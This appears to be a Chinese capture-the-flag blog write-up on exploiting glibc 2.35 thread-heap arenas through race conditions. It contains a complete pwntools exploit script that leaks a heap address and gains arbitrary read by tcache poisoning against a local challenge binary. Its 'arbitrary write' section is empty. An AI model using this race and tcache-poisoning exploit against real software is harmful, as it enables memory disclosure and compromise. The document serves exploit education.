---
layout: post
tags: [pwn]
title: "glibc 2.35 thread-heap: arenas 利用手法"
author: wsxk
date: 2025-5-20
comments: true
---

- [0. glibc 2.35与 glibc 2.31的区别](#0-glibc-235与-glibc-231的区别)
- [1. arbitrary read](#1-arbitrary-read)
- [2. arbitrary write](#2-arbitrary-write)

`thread heap的利用手法多数都是依靠race condition来获取任意地址读写的能力，辅以一些常见的tips即可完成利用`<br>
**任意地址读写的说法其实也适用于其他的利用手法,从这个角度来思考安全问题是很有意义的**<br>
# 0. glibc 2.35与 glibc 2.31的区别<br>
最主要的区别在于移除了`free_hook`等之前非常好用的符号,已经`safe-linking`机制:<br>
参考这篇文章：[https://wsxk.github.io/safelinking/](https://wsxk.github.io/safelinking/)<br>
另外在调试glibc2.35可以发现：glibc2.35中的`tcache->key`部分也发生了修改，不再是`tcache_perthread_struct`了，而是真的随机的值.如下图所示：<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250518105647.png)
总之，`tcache->key`部分已经没有了价值，但是`tcache->next`部分非常有用。<br>

# 1. arbitrary read<br>
**利用arbitrary read可以任意读取.bss段（没有添加PIE）、Thread heap、main heap中的数据（前提是知道地址）**<br>
race的利用难度主要在于调试（个人理解）<br>

```python
from pwn import *
import os

#binary_path = "/challenge/babyprime_level1.1"
binary_path = './babyprime_level1.1'
p = process(binary_path)
r1 = remote("127.0.0.1",1337)
r2 = remote("127.0.0.1",1337)

idx = 0
def leak_pthread_struct_addr(r1,r2):
    global idx
    while True:
        if os.fork() == 0:
            for _ in range(100000):
                r1.sendline(b"malloc %d scanf %d AAAAAAAABBBBBBBB free %d"%(idx,idx,idx))
            os.kill(os.getpid(),9)
        for _ in range(100000):
            r2.sendline(b"printf %d" % idx)
        os.wait()
        r1.clean()
        output = r2.clean()
        try:
            result = set(output.split(b"\n"))
            print(result)
            #pause()
            leak  = next(x for x in result if ((b"\x07" in x) and len(x)>=17))
            print(leak)
            leak = u64(leak[9:17].ljust(8,b"\x00"))
            if leak & 0xff != 0:
                print("leak error, try again!!!")
                continue
            break 
        except Exception as e:
            print(f"error:{e}")
            print(f"leak pthread_struct_addr try again!!!")
    idx += 1
    return leak

def arbitrary_read(r1,r2,addr):
    global idx
    r1.clean()
    r2.clean()
    r1.sendline(b"malloc %d malloc %d free %d" %(idx,idx+1,idx+1))
    while True:
        if os.fork() == 0:
            r1.sendline(b"free %d" %(idx))
            os.kill(os.getpid(),9)
        r2.sendline((b"scanf %d "% (idx) + p64(addr)+b"BBBBBBBB\n")*2000)
        os.wait()
        r1.sendline(b"malloc %d printf %d"%(idx,idx))
        r1.recvuntil(b"MESSAGE: ")
        output = r1.recvline().strip(b"\n")
        target = p64(addr).split(b"\x00")[0]
        if output == target:
            break
    r1.sendline(b"malloc %d"%(idx+1))
    r1.clean()
    r1.sendline(b"printf %d"% (idx+1))
    r1.recvuntil(b"MESSAGE: ")
    value = u64(r1.recvline().strip(b"\n").ljust(8,b"\x00"))
    return value

# gdb.attach(p,"continue\n")
# pause()
# r1.sendline(b"malloc 1")
# r1.sendline(b"scanf 1 AAAAAAAABBBBBBBB free 1")
# r2.sendline(b"malloc 2")
# r2.sendline(b"scanf 2 CCCCCCCCDDDDDDDD free 2")
# pause()
pthread_struct_addr = leak_pthread_struct_addr(r1,r2)<< 12
log.success(f"pthread_struct_addr: {hex(pthread_struct_addr)}")
secret = arbitrary_read(r1,r2,(pthread_struct_addr>>12)^0x405460)
log.success(f"secret: {hex(secret)}")
r1.sendline(b"send_flag")
r1.recvuntil(b"Secret: ")
r1.sendline(p64(secret))
output = r1.clean()
print(output)
p.interactive()
```

# 2. arbitrary write<br>




<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>